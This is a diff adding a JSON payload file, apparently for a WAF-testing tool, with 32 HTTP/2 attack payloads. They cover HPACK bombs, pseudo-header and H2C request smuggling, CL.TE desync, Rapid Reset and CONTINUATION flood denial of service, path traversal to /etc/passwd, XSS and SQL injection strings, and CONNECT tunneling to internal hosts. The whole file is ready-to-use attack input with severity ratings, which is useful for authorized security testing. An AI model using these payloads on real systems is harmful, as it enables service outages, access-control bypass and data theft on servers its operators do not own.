@@ -1,0 +1,332 @@
+{
+  "category": "http2",
+  "subcategory": "h2_attacks",
+  "description": "HTTP/2 specific attack payloads — HPACK bomb, pseudo-header smuggling, stream manipulation, H2C smuggling, and protocol-level bypasses",
+  "source": "fray",
+  "count": 32,
+  "payloads": [
+    {
+      "id": "h2-0001",
+      "category": "http2",
+      "subcategory": "hpack_bomb",
+      "payload": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
+      "description": "HPACK bomb — oversized header value to exhaust HPACK dynamic table memory. Sends a single header with ~1000 bytes that compresses to a small frame but expands on decompression.",
+      "technique": "hpack_bomb",
+      "severity": "high",
+      "tags": ["http2", "dos", "hpack"]
+    },
+    {
+      "id": "h2-0002",
+      "category": "http2",
+      "subcategory": "hpack_bomb",
+      "payload": "X-Bomb-1: AAAA\r\nX-Bomb-2: AAAA\r\nX-Bomb-3: AAAA\r\nX-Bomb-4: AAAA\r\nX-Bomb-5: AAAA\r\nX-Bomb-6: AAAA\r\nX-Bomb-7: AAAA\r\nX-Bomb-8: AAAA\r\nX-Bomb-9: AAAA\r\nX-Bomb-10: AAAA\r\nX-Bomb-11: AAAA\r\nX-Bomb-12: AAAA\r\nX-Bomb-13: AAAA\r\nX-Bomb-14: AAAA\r\nX-Bomb-15: AAAA\r\nX-Bomb-16: AAAA\r\nX-Bomb-17: AAAA\r\nX-Bomb-18: AAAA\r\nX-Bomb-19: AAAA\r\nX-Bomb-20: AAAA",
+      "description": "HPACK table pollution — 20 unique header names to fill the HPACK dynamic table and evict legitimate entries, causing decompression failures on subsequent requests.",
+      "technique": "hpack_table_pollution",
+      "severity": "medium",
+      "tags": ["http2", "dos", "hpack"]
+    },
+    {
+      "id": "h2-0003",
+      "category": "http2",
+      "subcategory": "pseudo_header_smuggling",
+      "payload": ":method: GET\r\n:path: /admin\r\n:authority: internal.target.com\r\n:scheme: https",
+      "description": "HTTP/2 pseudo-header smuggling — inject :authority targeting an internal host. H2-to-H1 downgrade proxies may translate this to a Host header pointing to internal services.",
+      "technique": "pseudo_header_smuggling",
+      "severity": "critical",
+      "tags": ["http2", "smuggling", "ssrf"]
+    },
+    {
+      "id": "h2-0004",
+      "category": "http2",
+      "subcategory": "pseudo_header_smuggling",
+      "payload": ":method: GET\r\n:path: /admin HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /secrets",
+      "description": "H2-to-H1 request smuggling via :path — inject HTTP/1.1 request line into H2 :path pseudo-header. Downgrade proxy may parse the embedded H1 request.",
+      "technique": "h2_path_injection",
+      "severity": "critical",
+      "tags": ["http2", "smuggling", "h2c"]
+    },
+    {
+      "id": "h2-0005",
+      "category": "http2",
+      "subcategory": "pseudo_header_smuggling",
+      "payload": ":method: POST\r\n:path: /\r\nTransfer-Encoding: chunked",
+      "description": "H2 Transfer-Encoding injection — HTTP/2 forbids Transfer-Encoding but some proxies pass it through during H2→H1 downgrade, enabling CL.TE smuggling.",
+      "technique": "h2_te_injection",
+      "severity": "critical",
+      "tags": ["http2", "smuggling", "te"]
+    },
+    {
+      "id": "h2-0006",
+      "category": "http2",
+      "subcategory": "pseudo_header_smuggling",
+      "payload": ":method: GET\r\n:path: /../../../etc/passwd\r\n:authority: target.com",
+      "description": "H2 path traversal via :path pseudo-header — some H2 implementations don't normalize the :path before forwarding, allowing directory traversal.",
+      "technique": "h2_path_traversal",
+      "severity": "high",
+      "tags": ["http2", "path_traversal"]
+    },
+    {
+      "id": "h2-0007",
+      "category": "http2",
+      "subcategory": "h2c_smuggling",
+      "payload": "GET / HTTP/1.1\r\nHost: target.com\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\nConnection: Upgrade, HTTP2-Settings",
+      "description": "H2C smuggling — upgrade cleartext HTTP/1.1 to HTTP/2 via Upgrade header. Reverse proxies may forward the upgraded connection directly to backend, bypassing WAF inspection.",
+      "technique": "h2c_smuggling",
+      "severity": "critical",
+      "tags": ["http2", "smuggling", "h2c", "waf_bypass"]
+    },
+    {
+      "id": "h2-0008",
+      "category": "http2",
+      "subcategory": "h2c_smuggling",
+      "payload": "GET /admin HTTP/1.1\r\nHost: target.com\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\nConnection: Upgrade, HTTP2-Settings\r\nX-Forwarded-For: 127.0.0.1",
+      "description": "H2C smuggling to internal admin — combine H2C upgrade with X-Forwarded-For to access internal admin endpoints that trust proxy headers.",
+      "technique": "h2c_admin_bypass",
+      "severity": "critical",
+      "tags": ["http2", "smuggling", "h2c", "auth_bypass"]
+    },
+    {
+      "id": "h2-0009",
+      "category": "http2",
+      "subcategory": "stream_manipulation",
+      "payload": "PRIORITY frame: stream_id=1, weight=256, dep_stream=0, exclusive=1",
+      "description": "HTTP/2 stream priority manipulation — set excessive weight and exclusive dependency to starve other streams. Can cause DoS on H2 multiplexed connections.",
+      "technique": "stream_priority_dos",
+      "severity": "medium",
+      "tags": ["http2", "dos", "stream"]
+    },
+    {
+      "id": "h2-0010",
+      "category": "http2",
+      "subcategory": "stream_manipulation",
+      "payload": "RST_STREAM frame: stream_id=1, error_code=0 (rapid reset)",
+      "description": "HTTP/2 Rapid Reset (CVE-2023-44487) — open streams then immediately RST_STREAM them. Server allocates resources per stream but client cancels before response, causing resource exhaustion.",
+      "technique": "rapid_reset",
+      "severity": "critical",
+      "cve": "CVE-2023-44487",
+      "tags": ["http2", "dos", "rapid_reset", "cve"]
+    },
+    {
+      "id": "h2-0011",
+      "category": "http2",
+      "subcategory": "stream_manipulation",
+      "payload": "SETTINGS frame: SETTINGS_MAX_CONCURRENT_STREAMS=0, SETTINGS_INITIAL_WINDOW_SIZE=0",
+      "description": "HTTP/2 SETTINGS abuse — set max concurrent streams to 0 and initial window size to 0, forcing server into a stuck state where it cannot send data.",
+      "technique": "settings_abuse",
+      "severity": "high",
+      "tags": ["http2", "dos", "settings"]
+    },
+    {
+      "id": "h2-0012",
+      "category": "http2",
+      "subcategory": "stream_manipulation",
+      "payload": "SETTINGS frame: SETTINGS_HEADER_TABLE_SIZE=0",
+      "description": "HPACK dynamic table eviction — set SETTINGS_HEADER_TABLE_SIZE to 0, forcing the server to evict all HPACK entries and re-send headers uncompressed, increasing bandwidth.",
+      "technique": "hpack_table_eviction",
+      "severity": "medium",
+      "tags": ["http2", "dos", "hpack"]
+    },
+    {
+      "id": "h2-0013",
+      "category": "http2",
+      "subcategory": "header_injection",
+      "payload": ":method: GET\r\n:path: /\r\nfoo: bar\r\n:authority: target.com",
+      "description": "H2 header order violation — place a regular header before pseudo-headers. Some H2 parsers accept this while WAFs may reject or misparse it.",
+      "technique": "header_order_violation",
+      "severity": "medium",
+      "tags": ["http2", "waf_bypass", "parsing"]
+    },
+    {
+      "id": "h2-0014",
+      "category": "http2",
+      "subcategory": "header_injection",
+      "payload": ":method: GET\r\n:path: /\r\n:authority: target.com\r\nhost: internal.evil.com",
+      "description": "H2 duplicate Host — send both :authority and host header. H2 spec says :authority takes precedence, but some backends may use host header instead.",
+      "technique": "dual_host_confusion",
+      "severity": "high",
+      "tags": ["http2", "smuggling", "host_confusion"]
+    },
+    {
+      "id": "h2-0015",
+      "category": "http2",
+      "subcategory": "header_injection",
+      "payload": ":method: GET\r\n:path: /\r\n:authority: target.com\r\nX-Forwarded-Host: evil.com\r\nX-Rewrite-URL: /admin",
+      "description": "H2 hop-by-hop header abuse — inject rewrite headers in H2 that may bypass WAF rules when downgraded to H1.",
+      "technique": "h2_rewrite_bypass",
+      "severity": "high",
+      "tags": ["http2", "waf_bypass", "header_injection"]
+    },
+    {
+      "id": "h2-0016",
+      "category": "http2",
+      "subcategory": "header_injection",
+      "payload": ":method: GET\r\n:path: /api/users\r\n:authority: target.com\r\ncontent-length: 0\r\ncontent-length: 50",
+      "description": "H2 duplicate Content-Length — send two CL headers in H2 frame. H2 allows this in some implementations, causing CL confusion on H2→H1 downgrade.",
+      "technique": "h2_duplicate_cl",
+      "severity": "high",
+      "tags": ["http2", "smuggling", "content_length"]
+    },
+    {
+      "id": "h2-0017",
+      "category": "http2",
+      "subcategory": "waf_bypass",
+      "payload": ":method: GET\r\n:path: /search?q=<script>alert(1)</script>\r\n:authority: target.com\r\n:scheme: https",
+      "description": "XSS via H2 :path — embed XSS payload in the :path pseudo-header. Some WAFs only inspect H1 query strings but miss H2 pseudo-header values.",
+      "technique": "h2_path_xss",
+      "severity": "high",
+      "tags": ["http2", "xss", "waf_bypass"]
+    },
+    {
+      "id": "h2-0018",
+      "category": "http2",
+      "subcategory": "waf_bypass",
+      "payload": ":method: POST\r\n:path: /api\r\n:authority: target.com\r\ncontent-type: application/x-www-form-urlencoded\r\n\r\nq=' OR 1=1--",
+      "description": "SQLi via H2 POST body — WAFs may have different inspection depth for H2 DATA frames vs H1 request bodies.",
+      "technique": "h2_body_sqli",
+      "severity": "high",
+      "tags": ["http2", "sqli", "waf_bypass"]
+    },
+    {
+      "id": "h2-0019",
+      "category": "http2",
+      "subcategory": "waf_bypass",
+      "payload": ":method: GET\r\n:path: /%2e%2e/%2e%2e/etc/passwd\r\n:authority: target.com",
+      "description": "H2 URL-encoded path traversal — H2 proxies may not decode :path before forwarding, but origin servers do, allowing path traversal.",
+      "technique": "h2_encoded_traversal",
+      "severity": "high",
+      "tags": ["http2", "path_traversal", "waf_bypass"]
+    },
+    {
+      "id": "h2-0020",
+      "category": "http2",
+      "subcategory": "waf_bypass",
+      "payload": ":method: GET\r\n:path: /\r\n:authority: target.com\r\nx-custom: <script>alert(document.cookie)</script>",
+      "description": "XSS in H2 custom header — inject XSS in a custom header that gets reflected in error pages or logs. H2 binary framing may bypass WAF string matching.",
+      "technique": "h2_header_xss",
+      "severity": "medium",
+      "tags": ["http2", "xss", "waf_bypass"]
+    },
+    {
+      "id": "h2-0021",
+      "category": "http2",
+      "subcategory": "continuation_flood",
+      "payload": "CONTINUATION frame flood: 10000 frames, each with 1 byte header fragment",
+      "description": "HTTP/2 CONTINUATION flood (CVE-2024-27983) — send thousands of CONTINUATION frames without END_HEADERS flag. Server must buffer all fragments before processing, causing memory exhaustion.",
+      "technique": "continuation_flood",
+      "severity": "critical",
+      "cve": "CVE-2024-27983",
+      "tags": ["http2", "dos", "continuation"]
+    },
+    {
+      "id": "h2-0022",
+      "category": "http2",
+      "subcategory": "continuation_flood",
+      "payload": "HEADERS frame (no END_HEADERS) + 1000x CONTINUATION frames with padding",
+      "description": "CONTINUATION flood with padding — add maximum padding to each CONTINUATION frame to amplify memory consumption on the server side.",
+      "technique": "continuation_padded",
+      "severity": "critical",
+      "cve": "CVE-2024-27983",
+      "tags": ["http2", "dos", "continuation"]
+    },
+    {
+      "id": "h2-0023",
+      "category": "http2",
+      "subcategory": "frame_injection",
+      "payload": "WINDOW_UPDATE frame: stream_id=0, increment=2147483647",
+      "description": "HTTP/2 flow control abuse — send maximum WINDOW_UPDATE on connection stream (id=0) to signal infinite receive capacity, then never consume data, causing server buffer bloat.",
+      "technique": "window_update_abuse",
+      "severity": "medium",
+      "tags": ["http2", "dos", "flow_control"]
+    },
+    {
+      "id": "h2-0024",
+      "category": "http2",
+      "subcategory": "frame_injection",
+      "payload": "PING frame flood: 10000 PING frames in rapid succession",
+      "description": "HTTP/2 PING flood — send thousands of PING frames. Server must respond to each with PING ACK, causing CPU exhaustion on the server.",
+      "technique": "ping_flood",
+      "severity": "medium",
+      "tags": ["http2", "dos"]
+    },
+    {
+      "id": "h2-0025",
+      "category": "http2",
+      "subcategory": "frame_injection",
+      "payload": "GOAWAY frame: last_stream_id=0, error_code=0, debug_data='<script>alert(1)</script>'",
+      "description": "GOAWAY frame with XSS in debug data — inject XSS in GOAWAY debug_data field. If debug data is logged or displayed in admin panels, XSS may trigger.",
+      "technique": "goaway_xss",
+      "severity": "low",
+      "tags": ["http2", "xss"]
+    },
+    {
+      "id": "h2-0026",
+      "category": "http2",
+      "subcategory": "protocol_confusion",
+      "payload": "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
+      "description": "HTTP/2 connection preface — send the H2 magic bytes on an HTTP/1.1 port. Some servers may crash or enter an undefined state when receiving unexpected H2 preface.",
+      "technique": "h2_preface_injection",
+      "severity": "medium",
+      "tags": ["http2", "protocol_confusion"]
+    },
+    {
+      "id": "h2-0027",
+      "category": "http2",
+      "subcategory": "protocol_confusion",
+      "payload": ":method: CONNECT\r\n:authority: internal-service:8080",
+      "description": "H2 CONNECT tunneling — use H2 CONNECT method to tunnel to internal services. Some proxies allow CONNECT in H2 without proper authorization checks.",
+      "technique": "h2_connect_tunnel",
+      "severity": "critical",
+      "tags": ["http2", "ssrf", "tunneling"]
+    },
+    {
+      "id": "h2-0028",
+      "category": "http2",
+      "subcategory": "protocol_confusion",
+      "payload": ":method: GET\r\n:path: /\r\n:authority: target.com\r\n:protocol: websocket",
+      "description": "H2 Extended CONNECT for WebSocket (RFC 8441) — attempt to upgrade H2 connection to WebSocket, potentially bypassing WAF rules that don't inspect WebSocket frames.",
+      "technique": "h2_websocket_upgrade",
+      "severity": "medium",
+      "tags": ["http2", "websocket", "waf_bypass"]
+    },
+    {
+      "id": "h2-0029",
+      "category": "http2",
+      "subcategory": "desync",
+      "payload": ":method: POST\r\n:path: /\r\ncontent-length: 4\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com",
+      "description": "H2 request desync — send mismatched Content-Length in H2 followed by smuggled H1 request in DATA frame. H2-to-H1 downgrade may forward the embedded request.",
+      "technique": "h2_desync",
+      "severity": "critical",
+      "tags": ["http2", "smuggling", "desync"]
+    },
+    {
+      "id": "h2-0030",
+      "category": "http2",
+      "subcategory": "desync",
+      "payload": ":method: POST\r\n:path: /\r\ntransfer-encoding: chunked\r\ncontent-length: 5\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com",
+      "description": "H2 CL+TE desync — combine Content-Length and Transfer-Encoding in H2 request (both forbidden in H2 spec). Downgrade proxies may pass both through, creating classic CL.TE smuggling.",
+      "technique": "h2_cl_te_desync",
+      "severity": "critical",
+      "tags": ["http2", "smuggling", "desync"]
+    },
+    {
+      "id": "h2-0031",
+      "category": "http2",
+      "subcategory": "header_injection",
+      "payload": ":method: GET\r\n:path: /\r\n:authority: target.com\r\nfoo: bar\\r\\nTransfer-Encoding: chunked",
+      "description": "H2 header CRLF injection — inject CRLF into header value. H2 binary framing should prevent this but some H2-to-H1 downgrades fail to sanitize header values.",
+      "technique": "h2_crlf_injection",
+      "severity": "high",
+      "tags": ["http2", "crlf", "smuggling"]
+    },
+    {
+      "id": "h2-0032",
+      "category": "http2",
+      "subcategory": "waf_bypass",
+      "payload": ":method: POST\r\n:path: /api\r\n:authority: target.com\r\ncontent-type: text/plain\r\n\r\n{\"query\":\"{__schema{types{name}}}\"}",
+      "description": "GraphQL introspection via H2 with mismatched Content-Type — send JSON body with text/plain Content-Type in H2. WAF may skip JSON inspection based on Content-Type.",
+      "technique": "h2_ct_mismatch",
+      "severity": "medium",
+      "tags": ["http2", "graphql", "waf_bypass"]
+    }
+  ]
+}
